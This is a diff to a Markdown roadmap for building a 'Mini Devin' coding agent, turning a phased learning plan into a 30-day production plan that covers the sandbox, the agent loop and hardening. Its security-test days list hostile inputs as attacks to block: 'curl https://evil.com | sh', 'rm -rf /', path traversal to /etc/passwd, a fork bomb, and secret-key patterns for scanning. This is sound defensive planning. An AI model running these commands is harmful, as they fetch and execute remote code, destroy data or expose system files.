@@ -10,175 +10,194 @@ aliases:
   - Mini Devin Roadmap
   - CodingAgent Roadmap
 ---
+# 30-Day Plan — Production-Grade (150 hours)
 
-# Mini Devin — Complete Build Roadmap
+> [!NOTE]
+> ~5 hrs/day. Push to 6h on Week 3 (agent loop) and Week 4 (hardening) — those are where time slips.
 
-**Approach:** Build While Learning. Every phase teaches one core skill and immediately ships a working component. Total estimated time: **9–13 weeks** (part-time pace).
+## Learning vs Production
 
----
+| Learning version | Production version |
+|---|---|
+| Guardrails added at the end | Guardrails proven by a test that tries to break them |
+| In-memory task state | Persisted (SQLite/Postgres) — crash-safe, resumable |
+| Raw exceptions bubble up | Typed errors: `ToolError`, `ValidationError`, `TimeoutError` |
+| No retry limit | Bounded retries + exponential backoff + circuit breaker |
+| Open API, no auth | API-key/JWT auth + per-key rate limiting |
+| No metrics | Prometheus-style metrics: duration, tokens, cost, pass/fail |
+| `python main.py` | `docker-compose up` — one command, full stack |
+| No CI | GitHub Actions: lint, type-check, tests, image build on every PR |
+| Sandbox trusted by design | Sandbox escape tests written as actual pytest tests |
 
-## Phase 0: Toy Agent (De-risk the Core Loop)
-
-**Duration:** 3–4 days
-**Goal:** Prove the fundamental "LLM calls tools in a loop" pattern works _before_ investing in infrastructure. This is the riskiest part of the whole project — validate it first, cheaply.
-
-**What to Learn:**
-
-- Basic tool-calling / function-calling API (OpenAI, Anthropic, etc.)
-- The Observe → Plan → Act loop in its simplest form
-- Why agents loop, stall, or hallucinate tool args
-
-**What to Build:**
-
-- A single Python script (no Docker, no WebSockets, no tree-sitter).
-- Three tools implemented with plain `subprocess`/`open()`: `read_file`, `write_file`, `run_shell`.
-- A `while` loop: send task → LLM picks a tool or finishes → execute → feed result back → repeat.
-- Test it on one real task: "Fix this failing test in this small repo."
-
-**Why this matters:** If your core reasoning loop is unreliable, no amount of infrastructure in later phases will fix that. You want to discover this on day 3, not week 8.
+> [!IMPORTANT]
+> Out of scope past Day 30: multi-tenant RBAC, Kubernetes, human-in-the-loop UI, gVisor/Firecracker.
 
 ---
 
-## Phase 1: Real-Time Async Engine & WebSockets
+## Week 1 — Foundation
 
-**Duration:** 1–2 weeks
-**Goal:** Learn to manage async execution and push live events (token streaming, terminal output, status updates) to a client.
+- [ ] **Day 1** — Repo scaffold: `uv`/`poetry`, pre-commit (`ruff` + `mypy`), `pydantic-settings` config, structured JSON logging. Implement `read_file`, `write_file`, `run_shell` with input validation and typed `ToolError` returns. Unit tests for all three tools including error paths.
 
-**What to Learn:**
+- [ ] **Day 2** — Core reasoning loop: task → LLM picks tool → execute → feed result back. Tool dispatch unit tests (mock LLM). Retry/backoff wrapper around LLM API calls. Token/cost tracker per call. Test on one real failing-test task.
 
-- Async Python primitives: `asyncio.TaskGroup`, `asyncio.Queue`, non-blocking IO
-- FastAPI `WebSocket` endpoints and connection management
-- Pydantic `BaseModel` for structured event schemas (`ThoughtEvent`, `ToolOutputEvent`)
+- [ ] **Day 3** — FastAPI skeleton: routers (`/health`, `/readiness`, `/tasks`, `/ws`), OpenAPI docs at `/docs`, WebSocket endpoint, versioned Pydantic event schemas (`ThoughtEvent`, `ToolCallEvent`, `ToolOutputEvent`, `TaskCompleteEvent`, `ErrorEvent`).
 
-**What to Build:**
+- [ ] **Day 4** — Async worker: `asyncio.TaskGroup` + `asyncio.Queue`. Graceful shutdown — drain in-flight tasks on SIGTERM. UUID `task_id` threaded through every log line and WS event. Queue-full returns 503.
 
-- A FastAPI WebSocket server that accepts a simulated multi-step task name.
-- An `asyncio.Queue` background worker executing 5 mock "steps" with variable delays, streaming structured JSON events over the socket as each step completes.
+- [ ] **Day 5** — Persistent task store: `Task` model (SQLAlchemy async), Alembic migration, `GET /tasks/{id}` and `GET /tasks?status=...`. On startup, mark interrupted RUNNING tasks as FAILED.
 
-**Improvisation — add a minimal frontend now, not later:**
+- [ ] **Day 6** — Minimal frontend: single-page HTML/JS with event stream pane + terminal pane. WS integration tests (httpx + pytest-asyncio): submit task → assert correct event sequence → assert DB record matches.
 
-- A single-page HTML/JS client (no framework needed) with:
-  - A live event/thought stream pane
-  - A raw terminal-output pane
-- This makes every later phase visibly testable instead of "read JSON in a WebSocket debugger," and it's motivating to actually _see_ the agent think.
+- [ ] **Day 7** — Wire Day 2 agent loop into the Day 3–6 server. End-to-end integration test: POST task → WS streams events → task completes → DB record correct. Token costs stored in DB.
+
+> [!TIP]
+> Week 1 checkpoint: typed config, structured logs, persisted task state, tested WS flow.
 
 ---
 
-## Phase 2: Secure Workspace & Execution Sandbox
+## Week 2 — Sandbox (Proven, Not Just Built) + Code Search
 
-**Duration:** 1–2 weeks
-**Goal:** Isolate AI-generated code execution so it cannot affect your host OS — and can't be used to exfiltrate data or hammer external services either.
+- [ ] **Day 8** — Docker SDK `WorkspaceManager`: `create(repo_url, commit_sha)`, `destroy()`, `get()`. GitPython shallow clone. All Docker errors wrapped as typed `WorkspaceError` — nothing raw leaks to the API layer.
 
-**What to Learn:**
+- [ ] **Day 9** — `execute_command(workspace_id, cmd, timeout_s)` async generator: yields `CommandOutputLine` structs. Cap total output at 1MB — emit `TRUNCATED` sentinel beyond that. Kill command and emit `TIMEOUT` sentinel if `timeout_s` exceeded.
 
-- The `docker` Python SDK: creating, starting, stopping, binding volumes
-- Programmatic git management via `GitPython`
-- Capturing live `stdout`/`stderr` from containers
-- **Container hardening:** resource limits, network policy, filesystem restrictions
+- [ ] **Day 10** — Container hardening: `mem_limit`, `cpu_quota`, `pids_limit` (256), read-only fs except `/workspace`, network egress disabled by default (`network_mode: none`), run as non-root user.
 
-**What to Build:**
+- [ ] **Day 11** — Security tests (the step most builds skip):
+  - Network escape: `curl https://8.8.8.8` inside container → must fail
+  - Filesystem escape: `open('/etc/crontab', 'w')` → must get PermissionError
+  - Fork bomb: killed by `pids_limit` within 5 seconds, host unaffected
+  - Memory exhaustion: container OOM-killed, not the host
+  - Path traversal: `path=../../etc/passwd` tool call → must return `ToolError`
 
-- A `WorkspaceManager` module:
-  1. Clone a sample GitHub repo into a temp host folder via `GitPython`.
-  2. Mount that folder as a volume inside an **unprivileged** Docker container.
-  3. Expose `execute_command(cmd: str)` that runs shell commands (`pytest`, `pip install`, `git status`) inside the container and yields output line-by-line via an async generator.
+- [ ] **Day 12** — tree-sitter AST indexer: file tree, module imports, class/function extraction (name, args, line span, docstring). `get_symbol_definition(name)` and `list_file_structure(path)`. Tests against a committed fixture repo.
 
-**Improvisation — harden the sandbox beyond "just Docker":**
+- [ ] **Day 13** — Embeddings + `chromadb`: chunk functions/classes from AST output, embed, store. `semantic_search(query, top_k=5)`. Hybrid search: exact match first, semantic fallback. Embedding cost logged per run.
 
-- Set `mem_limit`, `cpu_quota`/`cpu_period`, and `pids_limit` so a runaway process can't take down your host.
-- Mount the container filesystem **read-only** except the workspace volume.
-- Restrict or fully disable network egress by default — an agent that can run arbitrary shell commands and also has open internet access is a serious risk (`curl | sh`, data exfiltration). Only allowlist specific hosts if a task genuinely needs them (e.g., `pypi.org` for installs).
-- Note for later: if you want isolation closer to what Devin/production agents use, look into **gVisor** or **Firecracker** microVMs instead of plain Docker — optional, not required for the learning project.
+- [ ] **Day 14** — Wire sandbox + indexer into the agent loop. Integration test: submit task → workspace created → code indexed → agent navigates via search → pytest runs in sandbox → result returned. All Day 11 security tests still pass.
+
+> [!TIP]
+> Week 2 checkpoint: sandbox with passing security tests, structural + semantic search working.
 
 ---
 
-## Phase 3: Codebase AST Indexing & Structural + Semantic Search
+## Week 3 — LangGraph Loop with Bounded Failure Modes
 
-**Duration:** 1–2 weeks
-**Goal:** Parse source code structurally using syntax trees instead of relying solely on raw text/regex chunking — and add fuzzy search for when the agent doesn't know exact symbol names.
+- [ ] **Day 15** — LangGraph typed `AgentState` schema (task_id, plan, current_step, tool_history, reflection_history, retry_count, status). Planning Node with structured-output Pydantic validation. Retry-on-malformed-output (max 3 retries → `failed` state). SQLite-backed checkpoint persistence.
 
-**What to Learn:**
+- [ ] **Day 16** — Execution Node: LLM selects tool via `ToolCall(tool_name, args)` structured output. Validate args against tool schema before running. All errors populate `AgentState.last_error` as typed `ToolError(tool_name, code, message)` — never swallowed. Tool results stored in `tool_history`.
 
-- AST concepts: nodes, leaves, parent-child relationships
-- `tree-sitter` and `tree-sitter-python`
-- Writing SCM queries to extract function defs, imports, class hierarchies
-- **Embeddings basics** and a lightweight vector store
+- [ ] **Day 17** — Reflection Node: parse pytest output into `TestResult(passed, failed, errors, summary)`. Bounded retry: `retry_count >= MAX_RETRIES` → `failed` state with readable failure report. Exponential backoff (`2^retry` seconds) between retries. Circuit breaker: 3 consecutive API errors → open circuit, fail task with `CircuitOpenError`.
 
-**What to Build:**
+- [ ] **Day 18** — `apply_patch` tool: parse unified diff → dry-run validate → apply to disk. Reject patches that don't apply cleanly, have invalid syntax, or modify files outside workspace. Return typed `PatchError(reason, context)` on rejection.
 
-- A `CodebaseIndexer` that parses a target Python repo with `tree-sitter` and produces:
-  - File trees and module imports
-  - Class definitions, function signatures, line spans
-- Exact-match search functions: `get_symbol_definition(symbol_name)`, `list_file_structure()`
+- [ ] **Day 19** — Per-task token/cost budget: configurable `max_tokens` and `max_cost_usd`. Check before every LLM call — if budget exceeded, emit `BudgetExceededEvent`, write partial result to DB, transition to `failed` with `reason: budget_exceeded`. Expose `tokens_used`, `cost_usd`, `budget_remaining_pct` in task status API.
 
-**Improvisation — add semantic search alongside structural search:**
+- [ ] **Day 20** — End-to-end on 2 real bug-fix tasks (real GitHub repos, pre-existing failing tests). Measure pass/fail, retry count, tokens, wall-clock time. Every bug found during testing → write a regression test before fixing.
 
-- Chunk each function/class extracted by the AST indexer.
-- Embed the chunks and store them in a lightweight local vector DB (e.g., `chromadb` or even `faiss`).
-- Expose `semantic_search(query: str)` so the agent can ask "find code related to authentication" without knowing the exact function name — structural search alone can't answer that kind of query.
+- [ ] **Day 21** — Guardrails with proof (each must have a test that tries the attack):
+  - Path traversal: `../../etc/passwd` and `/workspace/../etc/passwd` → `ToolError`
+  - Dangerous commands: `rm -rf /` and `curl https://evil.com | sh` → `ToolError`
+  - Secrets scanner: scan file writes and command output for `AKIA*`, `sk-*`, PEM headers → redact + log `SecurityEvent`
+  - Prompt injection: tool output wrapped in untrusted-data delimiter before being passed to LLM
+
+> [!TIP]
+> Week 3 checkpoint: closed agent loop, tested guardrails, bounded failure modes.
 
 ---
 
-## Phase 4: State Machine & Agent Execution Loop
+## Week 4 — Hardening Sprint
 
-**Duration:** 2–3 weeks
-**Goal:** Manage the cyclic Observe → Plan → Act → Reflect loop and recover from errors — this time for real, wired into your Phase 1–3 infrastructure.
+- [ ] **Day 22** — Auth: API key validation as FastAPI `Depends(require_api_key)` on all `/tasks` and `/ws` routes. Per-key rate limiting — `429 Too Many Requests` + `Retry-After` when exceeded. Integration tests: 401 (no key), 403 (wrong key), 429 (rate limit hit), 200 (valid key).
 
-**What to Learn:**
+- [ ] **Day 23** — Prometheus metrics at `GET /metrics`: `agent_tasks_total{status}`, `agent_task_duration_seconds` (histogram, p50/p95/p99), `agent_tool_calls_total{tool_name,status}`, `agent_tokens_used_total{model}`, `agent_cost_usd_total{model}`, `agent_active_tasks` (gauge). Every log line has `task_id`, `tool_name`, `duration_ms`, `status`.
 
-- **LangGraph**: nodes, state schemas, conditional edges, checkpoint persistence
-- Structured Outputs: enforcing Pydantic schemas on LLM outputs (native structured-output APIs or `instructor`)
-- Multi-agent separation: _Planner_ (breaks down tasks) vs _Executor_ (writes code, invokes tools)
-- **Code-editing strategy: diffs vs whole-file rewrites**
+- [ ] **Day 24** — CI pipeline (`.github/workflows/ci.yml`): `ruff check`, `ruff format --check`, `mypy --strict`, `pytest` (unit + integration + security tests), Docker image build. Fail PR if coverage drops below threshold. CI badge + coverage badge in README.
 
-**What to Build:**
+- [ ] **Day 25** — Containerize the app: multi-stage Dockerfile (builder → minimal runtime), non-root user, all config from env. `docker-compose.yml`: `app` (FastAPI) + `db` (Postgres) + sandbox runtime. `docker-compose up` from a clean checkout → `POST /tasks` works immediately.
 
-- A LangGraph agent loop:
-  1. **Planning Node** — breaks a user request into a step list.
-  2. **Execution Node** — selects a tool (`write_file`, `read_file`, `run_docker_cmd`) via structured LLM calls.
-  3. **Reflection Node** — analyzes `pytest` stdout/stderr; on failure, feeds the error back into agent state to generate a fix.
+- [ ] **Day 26** — Concurrency/load test: fire 10 tasks simultaneously. Confirm rate limiting fires correctly, DB handles concurrent writes without corruption, containers get correct resource limits under load. Every load-test failure → regression test before fixing.
 
-**Improvisation — decide your edit strategy explicitly:**
+- [ ] **Day 27** — Eval suite: 3–5 real GitHub issues wired as a scheduled CI job (nightly, not every PR). Measures pass rate, avg tokens/cost, avg time-to-complete. Langfuse or LangSmith tracing: every LLM call traced with task_id, tokens, latency. Alert if pass rate drops below baseline.
 
-- Whole-file rewrites are simple but expensive and error-prone on large files.
-- Most production agents use **unified diffs** or **search-replace blocks** for edits instead. Pick one and implement it as a dedicated tool (`apply_patch`) rather than letting the LLM rewrite entire files by default — this directly affects how reliably your Reflection node can apply fixes.
+- [ ] **Day 28** — Security review pass: re-run Day 11 sandbox tests, re-run Day 21 guardrail tests. Run a task that touches a fake `.env` with fake secrets — assert nothing appears in logs or DB. Docker image audit: non-root, no unnecessary packages, no baked-in secrets. `trivy` scan — zero critical CVEs.
+
+> [!TIP]
+> Week 4 checkpoint: deployable, observable, rate-limited, tested system.
 
 ---
 
-## Phase 5: Integration, Guardrails & Evaluation
+## Days 29–30 — Final Integration & Demo
 
-**Duration:** 2 weeks
-**Goal:** Connect all components into an end-to-end platform with real safety guardrails and measurable performance.
+- [ ] **Day 29** — Architecture README: Mermaid system diagram (client → FastAPI → LangGraph → sandbox → DB), component descriptions, data flow, tech stack table. Runbook: deploy steps, key rotation, how to read `/metrics`, how to filter logs by `task_id`, common failure modes. Review `/docs` — all endpoints and schemas described with examples.
 
-**What to Learn:**
-
-- Input/output guardrails: path traversal (`../`) prevention, dangerous command filtering (`rm -rf`, `curl | sh`), token usage limits
-- Evaluation & benchmarking: test-pass rate, cost per task, trajectory length
-- Traceability: **Langfuse** or **LangSmith** for step-by-step debugging
-
-**What to Build:**
-
-- Combine Phases 1–4 into one application:
-  - **Backend:** FastAPI orchestrating LangGraph runs over WebSockets, executing inside Docker sandboxes, querying codebase AST + semantic indexes.
-  - **Evaluation Suite:** an automated test runner that gives Mini Devin 5 real GitHub issues (small bug-fix tasks with pre-written unit tests) and measures pass rate with no manual intervention.
-
-**Improvisation — expand the guardrail list:**
-
-- **Secrets/credential scanning** before the agent writes files or runs commands (catch accidental leaked API keys, `.env` contents, etc.)
-- **Hard per-task timeout / watchdog** — agents can loop indefinitely without one.
-- **Prompt-injection defense** for any content the agent ingests from tool outputs (web pages, issue trackers, file contents). Instructions embedded in that content should never be treated as trusted user instructions.
+- [ ] **Day 30** — Fresh-clone deploy: clone into a clean directory, follow README exactly, `docker-compose up`, run eval suite. Record a demo (GIF or video): submit task → live streaming events → test suite passes. Fix anything that breaks during the fresh-clone. Tag `v1.0.0`.
 
 ---
 
-## Summary Timeline
+## Final Checklist
 
-| Phase | Focus                                        | Duration  |
-| ----- | -------------------------------------------- | --------- |
-| 0     | Toy agent — validate the core reasoning loop | 3–4 days  |
-| 1     | Async engine + WebSockets + minimal frontend | 1–2 weeks |
-| 2     | Hardened Docker sandbox + GitPython          | 1–2 weeks |
-| 3     | AST + semantic codebase search               | 1–2 weeks |
-| 4     | LangGraph agent loop + diff-based editing    | 2–3 weeks |
-| 5     | Integration, guardrails, evaluation suite    | 2 weeks   |
+### Foundation
+- [ ] Typed config via `pydantic-settings` (zero hardcoded secrets)
+- [ ] Structured JSON logging with `task_id` on every line
+- [ ] Tool dispatch tested with mocked LLM
+- [ ] Retry/backoff on LLM API calls
+- [ ] Token/cost tracked and stored per task
+- [ ] FastAPI: health, readiness, WS, OpenAPI
+- [ ] Graceful SIGTERM shutdown (drain in-flight)
+- [ ] SQLAlchemy + Alembic task persistence
+- [ ] WS integration test: task → events → DB record
 
-**Total: ~9–13 weeks**, depending on pace and how deep you go into sandbox hardening (gVisor/Firecracker) and eval breadth.
+### Sandbox
+- [ ] `WorkspaceManager` with typed `WorkspaceError`
+- [ ] `execute_command` async generator: output cap + timeout
+- [ ] Container hardening: mem, cpu, pids, read-only fs, no network
+- [ ] Security tests: network, fs escape, fork bomb, OOM, path traversal — all passing
+
+### Code Intelligence
+- [ ] tree-sitter: symbol extraction, file structure, definition lookup
+- [ ] Semantic search via chromadb: natural-language code queries
+- [ ] Hybrid search: exact match preferred, semantic fallback
+
+### Agent Loop
+- [ ] LangGraph typed state with checkpoint persistence
+- [ ] Planning Node: structured output + retry-on-malformed
+- [ ] Execution Node: typed error taxonomy, no swallowed exceptions
+- [ ] Reflection Node: bounded retries + circuit breaker
+- [ ] `apply_patch`: dry-run validation before write
+- [ ] Token/cost budget: hard stop + partial result
+- [ ] Guardrails tested: path traversal, dangerous cmds, secrets, prompt injection
+
+### Hardening
+- [ ] API key auth + per-key rate limiting (429)
+- [ ] Prometheus `/metrics` with p99 latency histogram
+- [ ] CI: lint, type-check, tests, Docker build on every PR
+- [ ] Multi-stage Dockerfile + docker-compose: one-command start
+- [ ] Concurrency load test: 10 simultaneous tasks
+- [ ] Eval suite: nightly CI, pass-rate report
+- [ ] Full security review: guardrail tests, no secrets in logs/DB, non-root image, trivy clean
+
+### Portfolio
+- [ ] README with Mermaid architecture diagram
+- [ ] Runbook: deploy, key rotation, metrics, logs, failures
+- [ ] OpenAPI: all endpoints and schemas documented
+- [ ] Demo GIF/video in README
+- [ ] `v1.0.0` tagged
+- [ ] Fresh-clone verified end-to-end
+
+---
+
+## If You Fall Behind
+
+Cut in this order:
+1. Skip Day 26 load test — note as a known gap in README
+2. Trim eval suite from 5 to 3 issues
+3. Skip Langfuse/LangSmith — structured logs still give debuggability
+4. Defer semantic search (Day 13) — exact-match alone still works
+
+> [!CAUTION]
+> Do NOT cut: security tests (Days 11, 21, 28) or bounded-retry/circuit-breaker (Day 17). Those are what separate "production grade" from "works on my machine."
+
+---
+
+#coding-agent #python #llm #docker #langgraph #fastapi #systems #portfolio #30-day
